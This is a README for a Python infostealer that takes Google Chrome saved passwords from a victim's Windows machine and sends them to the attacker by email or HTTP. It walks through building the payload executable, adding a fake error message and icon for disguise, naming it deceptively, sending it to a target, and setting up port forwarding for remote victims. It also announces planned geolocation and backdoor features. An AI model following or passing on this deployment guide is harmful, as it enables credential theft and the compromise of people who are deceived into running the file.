#  Hacking Chrome Saved Passwords

***Version info: V3.2.3*** (released 21st January 2019)

### Detection:
It is rare for it to be detected, but could happen, mostly due to Py2Exe triggering false positives.  
[Here's a link to a virustotal scan](https://www.virustotal.com/#/file/89c21d936cdd7ee0a99645ff4698712327d9b539cf1c76944cc67c30cb2d2837/detection)  
[Here's a link to a Jotti scan](https://virusscan.jotti.org/en-US/filescanjob/yfl3mgm5zn)  
Note that Anti-AV techniques weren't explicitly used yet. That's for a future release if there's ever a need for it, considering the future features that are planned.

### Features:

	
	1. Grabs Google Chrome saved passwords
	2. Sends these passwords to the attacker via 
		* Email OR, 
		* HTTP directly to the attacker computer
		
	3. Option of having a fake Error Message appear
	4. Custom Icon

PS: This was originally part of one of my malwares so I had to adjust. I didn't have time to clean it up yet that's why it looks so messy.

### To do:
* Sending Real-time precise location of the victim (**completed, releases next update**)
* Option of installing a backdoor allowing remote control of the victim's computer (**completed, releases next update**)
* Recode in python 3 (**in progress**)
* Custom Fake message (**in progress**)
* Support for more email providers (**in progress**)
* Also steal passwords from other programs, such as keychains(**in progress**)
* Also steal Firefox passwords (**delayed**)

### Pre Requisites:

(**This program can be ran from Windows 7 to Windows 10 (all versions)**)

   1. Python 2.7	-  [Download](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi)
			 
   2. PyWin32	-  Installable by runing `pip install pypiwin32`  OR (if you get an error):  
   		`C:\Python27\Scripts\pip.exe install pywin32`
			 
   3. Requests	-  Installable by runing `pip install requests`   OR (if you get an error):  
		`C:\Python27\Scripts\pip.exe install requests`
			 
   4. py2exe 	-  [Download](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)
			 

### **IMPORTANT**: 
Enviroment Variables: It's recommended that you add the python executable to path. This can be done from installation, after you click the first "next", it will ask you to customize python. The only thing you need to do is scroll down and click on "Add python.exe to path" and select "will be installed". 
This isn't required.

# Quick usage:
My recommendation for using it is quite simple. Create a gmail account. Allow insecure apps.
Run the create_server.py and follow instructions. Then you can send the generated server.exe to the victim

# Instructions (More detailed):


## Local Exploitation (If your target is in the same network as you):

	
	1. If you want a custom icon place the icon on the same 
	directory as the scripts and rename it "icon.ico', replacing 
	the file that was already there with the same name. 
	If you don't want a custom icon, *skip this step*.
	
	
	2. If you want a custom icon, place the icon on the same 
	directory as the scripts and rename it "icon.ico', replacing 
	the file that was already there with the same name. 
	If you don't want a custom icon, **skip this step**.
	
	
	
	3. Create server by runing the python script "create_server.py"
	It will then ask you to choose between 2 options, either email or client.exe.
	
		* (1) If you choose email you first need to create a gmail account 
		and then input the created username and password into the program. You
		will then need to enable less secure apps to run:
		(https://support.google.com/accounts/answer/6010255?hl=en).
		You might also want to Check this out: 
		https://support.google.com/accounts/answer/6010255?hl=en
		* (2) If you choose the client.exe, it will ask you for your local ip.
		To find this ip open up CMD and type "ipconfig", it should be listed as IPv4
		
		
	4. Then it will ask you if you want to enable the fake message. 
	This is a fake Error that appears when someone tries to open the program, 
	to make it look more legitimate. Type **Y** if you want to activate it (recommended)
	or **N** if you don't.
	
		
	5. Start the client.exe **Skip this step if you have chosen step number (1) before**
	(I like having the client, and all other files in a directory in "C:\", like "C:\ChromePass\[files]")
	
	
	6. Send the server.exe to your target 
	(choosing an appropriate name is always important)
	
	
	7. You will obtain a password text file in the same location 
	as the client, or in your email depending on how you decided
	with all the Google Chrome Passwords.


## Remote Exploitation (If target is NOT on the same network as you):

	1. If you want a custom icon place the icon on the same directory as the 
	scripts and rename it "icon.ico', replacing the file that was already there with the same name. 
	If you don't want a custom icon, *skip this step*.
	
	
	2. If you want a custom icon, place the icon on the same directory as the scripts 
	and rename it "icon.ico', replacing the file that was already there with the same name. 
	If you don't want a custom icon, **skip this step**.	
	
	
	3. Create server by runing the python script "create_server.py"
	It will then ask you to choose between 2 options, either email or client.exe.
	
		* (1) If you choose email you first need to create a gmail account 
		and then input the created username and password into the program. You
		will then need to enable less secure apps to run:
		(https://support.google.com/accounts/answer/6010255?hl=en).
		You might also want to Check this out: 
		https://support.google.com/accounts/answer/6010255?hl=en
		
		* (2) If you choose the client.exe, it will ask you for your ip.
		 you must type your PUBLIC ip (ex: 152.162.93.12). 
		You can obtain your public ip by typing "WhatIsMyIp" on Google.
	
	
	4. Setup Port forwading. You want to forward the port 80 to your machine 
	(look up how to do that if you don't know), you can use this guide:
	https://www.howtogeek.com/66214/how-to-forward-ports-on-your-router/
	You can then test if your port forwarding was successful using this website:
	http://canyouseeme.org/
	
	**Skip step 5 if you have chosen number (1) during step 3**
	
	5. Start the client.exe 
	(I recommend having the client, alongside all other files in a directory in 
	"C:\", like "C:\ChromePass\[all_files]")


	6. Send the server.exe to your target 
	(choosing an appropriate name is always important)
	
	
	7. You will obtain a password text file in the same location 
	as the client, or in your email depending on how you decided
	with all the Google Chrome Passwords.
	

	
## NOTE:
	DO NOT change the name of the python scripts or text files. 
	  
	If everything seems to work but you aren't receiving the text file, try moving yor client.exe to 
	C:\ directory (i.e. "C:\client.exe") and run both client and server again.  
	  
	In case you're using the client method (not the email one):
		Make sure the client is runing before the server runs
		Password text file will be saved in the same diretory as the client.exe file.
	

### Feel free to join my Discord Server: [Whitehat Hacking](https://discord.gg/qBfC36j)

#### Any questions open up an issue on GitHub or contact me at: MarioNascimento@ITCrashSecurity.com
#### Please make sure your issue hasn't been answered before, to avoid duplicate issues on Github page.


#### DISCLAIMER: I will not be held responsible for the misuse of these scripts. EDUCATIONAL or PROFESSIONAL use only
